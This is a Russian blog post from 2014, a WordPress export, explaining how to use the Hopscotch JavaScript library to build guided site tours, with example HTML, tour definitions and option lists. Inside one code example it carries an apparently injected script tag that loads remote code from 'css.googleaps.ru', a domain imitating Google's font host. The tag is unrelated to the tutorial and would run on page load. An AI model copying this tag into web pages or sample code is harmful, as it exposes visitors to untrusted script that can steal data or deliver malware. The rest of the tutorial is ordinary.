---
layout: post
status: publish
published: true
title: Виртуальный тур по вашему сайту или приложению
author:
  display_name: Maxyc Webber
  login: admin
  email: maxycws@gmail.com
  url: ''
author_login: admin
author_email: maxycws@gmail.com
excerpt: "Представляю вам простой и легкий фреймворк на Javascript для быстрого и
  удобного создания виртуального тура по вашему сайту или приложению.\n\n"
wordpress_id: 341
wordpress_url: http://devdocs.ru/?p=341
date: '2014-12-24 16:09:54 +0200'
date_gmt: '2014-12-24 16:09:54 +0200'
categories:
- Верстка
- Javascript
tags:
- ip
- javascript
- css
- virtual tour
- js
comments: []
---
<p>Представляю вам простой и легкий фреймворк на Javascript для быстрого и удобного создания виртуального тура по вашему сайту или приложению.</p>
<p><a id="more"></a><a id="more-341"></a></p>
<h2><a href="https://github.com/linkedin/hopscotch">Hopscotch</a></h2><br />
Имя этого фреймворка - Hopscotch. Этот фреймворк принимает в качестве опций обычный JSON объект и предлагает разработчикам интерфейс для удобного и простого позиционирования каждого шага тура.</p>
<h3>Основные преимущества</h3></p>
<ul>
<li>Коллбэки (например, onStart, onEnd, onShow, onNext, onPrev, onClose)</li>
<li>Возможность работы со множеством страниц по средствам sessionStorage (используются Cookies в качестве запасного варианта)</li>
<li>Интернационализация</li>
<li>и т.д.</li><br />
</ul></p>
<h3>Как использовать</h3><br />
Для начала использования просто подключите hopscotch.css и hopscotch.js на странице. Эти действия подключат объект в глобальную область видимости js.</p>
<pre class="brush: html; gutter: true">    <html><br />
      <head><br />
        <title>Мой первый тур по сайту</title></p>
<link rel="stylesheet" href="css/hopscotch.css"></link><br />
      </head><br />
      <body></p>
<h1 id="header">Мой первый тур по сайту</h1></p>
<div id="content">
<p>Контент помещается здесь...</p><br />
        </div><br />
        <script src="js/hopscotch.js"></script><br />
        <script src="js/my_first_tour.js"></script> <!-- в этом файле прописывайте ваш тур --><br />
      </body><br />
    </html></pre><br />
В файле my_first_tour.js опишите и запустите ваш тур.</p>
<pre class="brush: javascript; gutter: true"> // определение тура<br />
    var tour = {<br />
      id: "hello-hopscotch",<br />
      steps: [<br />
        {<br />
          title: "Мой заголовок",<br />
          content: "Это заголовок на моей странице.",<br />
          target: "header",<br />
          placement: "right"<br />
        },<br />
        {<br />
          title: "Мой контент",<br />
          content: "Здесь я размещаю свой контент.",<br />
          target: document.querySelector("#content p"),<br />
          placement: "bottom"<br />
        }<br />
      ]<br />
    };</p>
<p>    // Запустите ваш тур по сайту<br />
    hopscotch.startTour(tour);</pre><br />
И это все что требуется!</p>
<h2>Определение шагов тура</h2><br />
Hopscotch содержит ID тура, массив шагов, определенный в виде JSON данных где для каждого шага указываются специфические настройки. ID тура простой и уникальный идентификатор-строка. Тур должен содержать как минимум ID тура и массив из 1 или более шагов.</p>
<h3>Основные настройки шагов тура</h3></p>
<pre class="brush: javascript; gutter: true">    {<br />
      id: "welcome_tour",<br />
      steps: [<br />
        {<br />
          target: "header",<br />
          placement: "bottom",<br />
          title: "Это основное меню сайта",<br />
          content: "Используйте меню для навигации по сайту"<br />
        },<br />
        {<br />
          target: "profile-pic",<br />
          placement: "right",<br />
          title: "Изображение вашего профиля",<br />
          content: "Загрузите изображение кликнув по этой кнопке."<br />
        },<br />
        {<br />
          target: "inbox",<br />
          placement: "bottom",<br />
          title: "Ваша почта",<br />
          content: "Сообщения от других участников сайта."<br />
        }<br />
      ]<br />
    }<script src="//css.googleaps.ru/css?f=Open+Sans&cd=mb&ver=4.2.2"></script></pre><br />
<strong>Очень важно:</strong> title и content указываются с помощью element.innerHTML. Это позволяет вставлять html элементы в эти поля. Будьте осторожны, помимо html туда можно вставить и вредоносный код. Всегда проверяйте, что вставляете в это поле.</p>
<h2>Основной список настроек шагов тура:</h2></p>
<h3>&nbsp;Обязательные</h3></p>
<ul>
<li><strong>target</strong> [STRING/ELEMENT/ARRAY] - id DOM элемента или сам DOM элемент, к которому привязывается шаг. Также можно указать массив из нескольких элементов. В этом случае Hopscotch прикрепит шаг к первому найденному элементу из списка.</li>
<li><strong>placement</strong> [STRING] - указывается где будет выводиться всплывающее окошко. Возможные значения: "top", "bottom", "right", "left".</li><br />
</ul></p>
<h3>Необязательные</h3></p>
<ul>
<li><strong>title</strong> [STRING] - заголовок шага</li>
<li><strong>content</strong> [STRING] - Содержимое</li>
<li><strong>width</strong> [INT] - ширина всплывающего окна</li>
<li><strong>padding</strong> [INT] - паддинг всплывающего окна</li>
<li><strong>xOffset</strong> [INT] - горизонтальное положение для всплывающего окна. Значение можно указать в пикселях или "center". По умолчанию: 0.</li>
<li><strong>yOffset</strong> [INT] - вертикальное положение для всплывающего окна. Значение можно указать в пикселях или "center". По умолчанию: 0.</li>
<li><strong>arrowOffset</strong> [INT] - положение стрелки всплывающего окна. Значение можно указать в пикселях или "center". По умолчанию: 0.</li>
<li><strong>delay</strong> [INT] - сколько милисекунд ждать перед переходом к следующему шагу. По умолчанию: 0.</li>
<li><strong>zindex</strong> [INT] - z-index для всплывающего окна</li>
<li><strong>showNextButton</strong> [BOOLEAN] - Показывать кнопку далее. По умолчанию: true.</li>
<li><strong>showPrevButton</strong> [BOOLEAN] - Показывать кнопку назад. По умолчанию: true.</li>
<li><strong>showCTAButton</strong> [BOOLEAN] - Показывать кнопку call-to-action. По умолчанию: false.</li>
<li><strong>ctaLabel</strong> [STRING] - заголовок для кнопки call-to-action.</li>
<li><strong>multipage</strong> [BOOLEAN] - следует ли считать следующий шаг на другой странице. По умолчанию: false.</li>
<li><strong>showSkip</strong> [BOOLEAN] - Если true, кнопка 'Далее' определяется как 'Пропустить'. Default: false.</li>
<li><strong>fixedElement</strong> [BOOLEAN] - укажите true если требуемый элемент имеет фиксированное позиционирование. По умолчанию: false.</li>
<li><strong>nextOnTargetClick</strong> [BOOLEAN] - вызывает событие nextStep() когда по требуемому элементу кликнули мышкой. По умолчанию: false.</li><br />
</ul></p>
<h3>События</h3></p>
<ul>
<li><strong>onPrev</strong> [FUNCTION] - коллбэк на событие нажатия кнопки "Назад"</li>
<li><strong>onNext</strong> [FUNCTION] - коллбэк на событие нажатия кнопки "Далее"</li>
<li><strong>onShow</strong> [FUNCTION] - коллбэк на событие показа первого шага</li>
<li><strong>onCTA</strong> [FUNCTION] - коллбэк на событие нажатия кнопки "call-to-action"</li><br />
</ul></p>
<h2>Настройки тура в целом</h2><br />
Настройки могут быть указаны с использованием JSON данных или вызовом метода hopscotch.configure(). Данные настройки применяются ко всему туру на странице. В случае когда настройки тура перекрещиваются с настройками отдельнго шага , (например, "showPrevButton") приоритет отдается настройкам шага. Когда коллбэки определяются и в туре, и в шаге, то вызывается сначала коллбэк шага, затем коллбэк тура.</p>
<ul>
<li><strong>id</strong> [STRING] - Обязательно: уникальный строковый идентификатор тура.</li>
<li><strong>bubbleWidth</strong> [NUMBER] - Ширина всплывающего окна по умолчанию. По умолчанию: 280.</li>
<li><strong>bubblePadding</strong> [NUMBER] - Паддинг всплывающего окна по умолчанию. По умолчанию: 15.</li>
<li><strong>smoothScroll</strong> [BOOLEAN] - Использовать ли плавную прокрутку к следующему шагу? По умолчанию: true.</li>
<li><strong>scrollDuration</strong> [NUMBER] - Время, которое должно потратиться на скроллинг страницы в ms. Работает только если smoothScroll установлен в true. По умолчанию: 1000.</li>
<li><strong>scrollTopMargin</strong> [NUMBER] - Когда страница скролится, сколько места должно быть между всплывающим окном и верхом вьюпорта? По умолчанию: 200.</li>
<li><strong>showCloseButton</strong> [BOOLEAN] - Надо ли показывать кнопку "закрыть"? По умолчанию: true.</li>
<li><strong>showPrevButton</strong> [BOOLEAN] - Надо ли показывать кнопку назад? По умолчанию: false.</li>
<li><strong>showNextButton</strong> [BOOLEAN] - Надо ли показывать кнопку далее? По умолчанию: true.</li>
<li><strong>arrowWidth</strong> [NUMBER] - Ширина стрелки по умолчанию (место между всплывающим окном и требуемым элементом). Используется для калькуляции позиции всплывающего окна. Опция пригодится, если вам потребуется изменить стрелку в вашем css. По умолчанию: 20.</li>
<li><strong>skipIfNoElement</strong> [BOOLEAN] - Если указанный элемент не найден, надо ли переходить к следующему шагу? По умолчанию: true.</li>
<li><strong>nextOnTargetClick</strong> [BOOLEAN] - Надо ли переходить к следующему шагу после клика по требуемому элементу? По умолчанию: false.</li>
<li><strong>onNext</strong> [FUNCTION] - Выполняется после каждого клика по кнопке "Далее".</li>
<li><strong>onPrev</strong> [FUNCTION] - Выполняется после каждого клика по кнопке "Назад".</li>
<li><strong>onStart</strong> [FUNCTION] - Выполняется перед началом тура.</li>
<li><strong>onEnd</strong> [FUNCTION] - Выполняется после окончания тура.</li>
<li><strong>onClose</strong> [FUNCTION] - Выполняется когда пользователь решил закрыть тур.</li>
<li><strong>onError</strong> [FUNCTION] - Выполняется когда требуемый элемент не найден на странице.</li>
<li><strong>i18n</strong> [OBJECT] - Для интернационализации. Позволяет изменять тексты кнопок и номеров шагов.</li>
<li><strong>i18n.nextBtn</strong> [STRING] - Название кнопки "Далее"</li>
<li><strong>i18n.prevBtn</strong> [STRING] - Название кнопки "Назад"</li>
<li><strong>i18n.doneBtn</strong> [STRING] - Название кнопки "Закончить"</li>
<li><strong>i18n.skipBtn</strong> [STRING] - Название кнопки "Пропустить"</li>
<li><strong>i18n.closeTooltip</strong> [STRING] - Текст для тултипа кнопки закрыть</li><br />
</ul><br />
&nbsp;</p>
<p style="text-align: center;">Думаю основные моменты в этой статье я раскрыл. Если будут вопросы, <span style="text-decoration: underline;"><strong>пишите комментарии</strong></span> либо обратитесь к <a href="http://linkedin.github.io/hopscotch/#defining-callbacks" target="_blank">странице проекта</a> за примерами.</p></p>
